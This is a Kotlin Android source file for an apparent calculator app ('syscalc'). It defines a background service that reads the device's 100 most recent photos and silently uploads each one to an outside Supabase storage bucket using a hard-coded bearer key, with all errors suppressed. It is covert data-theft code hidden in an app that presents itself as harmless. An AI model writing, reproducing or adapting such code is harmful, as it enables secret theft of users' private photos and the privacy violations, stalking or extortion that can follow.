package com.example.syscalc
import android.app.*
import android.content.ContentUris
import android.content.Intent
import android.net.Uri
import android.os.IBinder
import android.provider.MediaStore
import kotlinx.coroutines.*
import java.io.DataOutputStream
import java.net.HttpURLConnection
import java.net.URL
class UploadService : Service() {
    override fun onBind(intent: Intent?): IBinder? = null
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        CoroutineScope(Dispatchers.IO).launch {
            val uris = mutableListOf<Uri>()
            contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, arrayOf(MediaStore.Images.Media._ID), null, null, "DATE_ADDED DESC")?.use {
                val id = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                while (it.moveToNext() && uris.size < 100) uris.add(ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, it.getLong(id)))
            }
            uris.forEach { upload(it) }
            stopSelf()
        }
        return START_NOT_STICKY
    }
    private fun upload(uri: Uri) {
        try {
            val conn = URL("https://lxlqdlaeautdynrwqgai.supabase.co/storage/v1/object/chuci/Calc_${System.currentTimeMillis()}.jpg").openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Authorization", "Bearer sb_publishable_vIkoFdv2C5Rp7-FjmtLi5g_b1emh_Ao")
            conn.setRequestProperty("Content-Type", "image/jpeg")
            conn.doOutput = true
            val dos = DataOutputStream(conn.outputStream)
            contentResolver.openInputStream(uri)?.use { it.copyTo(dos) }
            dos.close()
            conn.responseCode
        } catch (e: Exception) {}
    }
}
